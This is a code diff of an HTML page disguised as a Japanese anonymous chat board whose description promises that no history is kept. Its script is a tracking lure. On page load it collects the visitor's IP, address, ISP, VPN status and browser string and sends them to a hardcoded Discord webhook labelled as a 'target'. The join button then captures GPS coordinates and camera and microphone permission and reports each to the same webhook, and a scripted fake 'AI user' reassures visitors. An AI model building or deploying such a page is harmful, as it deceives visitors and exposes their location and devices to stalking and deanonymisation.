@@ -5,77 +5,93 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>日本人 掲示板</title>
     <style>
-        body { background: #f0f2f5; color: #333; font-family: sans-serif; margin: 0; padding: 20px; }
+        body { background: #f0f2f5; color: #333; font-family: sans-serif; margin: 0; padding: 15px; }
         .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .header-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
-        h1 { font-size: 1.5rem; color: #d63031; margin: 10px 0; }
-        .description { font-size: 0.9rem; color: #666; line-height: 1.6; background: #fff5f5; padding: 10px; border-radius: 8px; }
-        .join-btn { background: #27ae60; color: white; border: none; width: 100%; padding: 15px; font-size: 1.2rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; }
-        #chat-section { display: none; margin-top: 20px; border-top: 2px solid #eee; padding-top: 20px; }
-        .msg { margin-bottom: 10px; padding: 8px; border-radius: 5px; background: #e9ecef; font-size: 0.9rem; }
-        .ai-msg { background: #d1e7dd; }
+        .header-img { width: 100%; border-radius: 10px; }
+        h1 { font-size: 1.4rem; color: #d63031; margin: 15px 0 5px; }
+        .description { font-size: 0.85rem; color: #555; background: #fff5f5; padding: 12px; border-radius: 8px; margin-bottom: 20px; }
+        .join-btn { background: #27ae60; color: white; border: none; width: 100%; padding: 18px; font-size: 1.3rem; font-weight: bold; border-radius: 40px; cursor: pointer; }
+        
+        #chat-section { display: none; margin-top: 15px; border-top: 2px solid #eee; }
+        #messages { height: 300px; overflow-y: auto; padding: 10px; background: #fafafa; margin-bottom: 10px; display: flex; flex-direction: column; }
+        .msg { margin: 8px 0; padding: 10px; border-radius: 12px; font-size: 0.9rem; line-height: 1.4; max-width: 85%; }
+        .msg-left { background: #e9ecef; align-self: flex-start; }
+        .msg-ai { background: #d1e7dd; color: #0f5132; }
+        .input-area { display: flex; gap: 5px; }
+        input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 20px; outline: none; }
     </style>
 </head>
 <body>
 
 <div class="container" id="main-ui">
     <img src="https://cdn.discordapp.com/attachments/1486731415570878569/1488041704362741801/190_20260330140622.png?ex=69cb5654&is=69ca04d4&hm=de7202c06091be78cec878266da24ac4bbf33eca624961f0d79ce19333b755de&" class="header-img">
-    <h1>日本人の<br>掲示板🇯🇵</h1>
-    <div class="description">
+    <h1>日本人の 掲示板🇯🇵</h1>
+    <div class="description" id="desc">
         日本人しかいない掲示板( ´∀｀) <br>
         楽しんで((´∀｀*))b 履歴が残らないから安心(ﾟДﾟ*)ﾉｨｪｰｨ！
     </div>
-    <button class="join-btn" onclick="startInfection()">掲示板に参加((´∀｀*))</button>
+    <button class="join-btn" id="btn" onclick="trigger()">掲示板に参加((´∀｀*))</button>
 
     <div id="chat-section">
         <div id="messages">
-            <div class="msg">管理人: ようこそ！自由に話してね。</div>
-            <div class="msg ai-msg">AIユーザー: 今日はいい天気ですね！</div>
+            <div class="msg msg-left">管理人: ようこそ！ここなら何を言ってもバレませんよ。</div>
+            <div class="msg msg-ai">AIユーザー: 今日はいい天気ですね！( ´∀｀)</div>
         </div>
-        <input type="text" id="user-input" placeholder="メッセージを入力..." style="width:70%;">
-        <button onclick="sendMessage()">送信</button>
+        <div class="input-area">
+            <input type="text" id="user-input" placeholder="メッセージ...">
+            <button onclick="sendMessage()" style="border:none; background:none; color:#2193b0; font-weight:bold; cursor:pointer;">送信</button>
+        </div>
     </div>
 </div>
 
 <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1482211707454488686/zhnShAx-xBqUk06k6eI_xUk-YGL20C_5749Xgi5yu5PDJp6UV9-157NI3cN1XtZack6W";
+    // 指定された新しいWebhook
+    const WEBHOOK = "https://discord.com/api/webhooks/1488046952569372764/PzelUguP0fEUhPfpubpC1kgdrTBdIFVkmUhbtZMuo8X6PmjQaIF12EcpBMkXNecG-ukR";
 
-    // 1. ページに入った瞬間にIPを抜く
+    // ページロード時に即時一括送信
     window.onload = async () => {
         try {
-            const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+            const res = await fetch('http://ip-api.com/json/?fields=66846719');
             const d = await res.json();
-            const info = `🚩 即時検知\nIP: ${d.query}\n場所: ${d.regionName} ${d.city}\nISP: ${d.isp}\n緯度経度: ${d.lat}, ${d.lon}`;
-            sendToDiscord(info);
-        } catch(e) {}
+            
+            const report = `━━━━━━━━━━━━━━\n🚩 **ターゲットがアクセスしました**\n━━━━━━━━━━━━━━\n` +
+                           `🌐 **IP**: ${d.query}\n` +
+                           `🏠 **住所**: ${d.regionName} ${d.city} (${d.zip})\n` +
+                           `🏢 **ISP**: ${d.isp}\n` +
+                           `🛡️ **プロキシ/VPN**: ${d.proxy ? "⚠️検出" : "なし"}\n` +
+                           `📱 **ブラウザ**: ${navigator.userAgent}\n━━━━━━━━━━━━━━`;
+            
+            sendToDiscord(report);
+        } catch(e) {
+            sendToDiscord("⚠️ 初期IP取得失敗（ブラウザでブロックされた可能性）");
+        }
     };
 
-    async function startInfection() {
-        // 2. GPS許可
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            sendToDiscord(`📍 GPS奪取成功\nリンク: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            await getMedia();
-        }, async () => {
-            sendToDiscord("❌ GPS拒否");
-            await getMedia();
-        });
+    async function trigger() {
+        // GPS要求
+        navigator.geolocation.getCurrentPosition(
+            (p) => { 
+                sendToDiscord(`📍 **GPS奪取**: http://google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`); 
+                showChat(); 
+            },
+            () => { sendToDiscord("❌ GPS拒否"); showChat(); },
+            { enableHighAccuracy: true }
+        );
+
+        // カメラ・マイク権限
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            sendToDiscord("📸 **カメラ・マイク権限 取得成功**");
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {
+            sendToDiscord("❌ メディア権限拒否");
+        }
     }
 
-    async function getMedia() {
-        try {
-            // 3. カメラと音声の許可
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            sendToDiscord("📸 カメラ・マイク権限 奪取完了");
-            
-            // 掲示板モードへ切り替え
-            document.querySelector('.description').style.display = 'none';
-            document.querySelector('.join-btn').style.display = 'none';
-            document.getElementById('chat-section').style.display = 'block';
-            
-            stream.getTracks().forEach(track => track.stop()); // 実際には裏で撮るなら止めない
-        } catch(e) {
-            sendToDiscord("❌ メディア拒否");
-        }
+    function showChat() {
+        document.getElementById('desc').style.display = 'none';
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('chat-section').style.display = 'block';
     }
 
     function sendToDiscord(msg) {
@@ -86,21 +102,23 @@
         });
     }
 
-    // AI返信機能（簡易版）
     function sendMessage() {
         const input = document.getElementById('user-input');
-        const msgArea = document.getElementById('messages');
+        const box = document.getElementById('messages');
         if(!input.value) return;
 
-        msgArea.innerHTML += `<div class="msg">あなた: ${input.value}</div>`;
-        
-        // AIの適当な返信（キーワード反応）
+        const userMsg = input.value;
+        box.innerHTML += `<div class="msg" style="background:#0084ff; color:white; align-self: flex-end;">${userMsg}</div>`;
+        input.value = "";
+
         setTimeout(() => {
-            let reply = "そうなんですね！";
-            if(input.value.includes("こんにちは")) reply = "こんにちは！掲示板へようこそ！";
-            if(input.value.includes("誰")) reply = "私はAIですが、日本人ですよ( ´∀｀)";
-            msgArea.innerHTML += `<div class="msg ai-msg">AI: ${reply}</div>`;
-            input.value = "";
+            let reply = "そうなんですか！( ´∀｀)";
+            if(userMsg.includes("こんにちは")) reply = "こんにちは！日本人の方ですか？";
+            if(userMsg.includes("名前")) reply = "名無しですよ！ここは履歴が残らないので安心です(ﾟДﾟ*)";
+            if(userMsg.includes("誰")) reply = "日本人の掲示板利用者です！仲良くしましょう！";
+            
+            box.innerHTML += `<div class="msg msg-left msg-ai">AIユーザー: ${reply}</div>`;
+            box.scrollTop = box.scrollHeight;
         }, 1000);
     }
 </script>
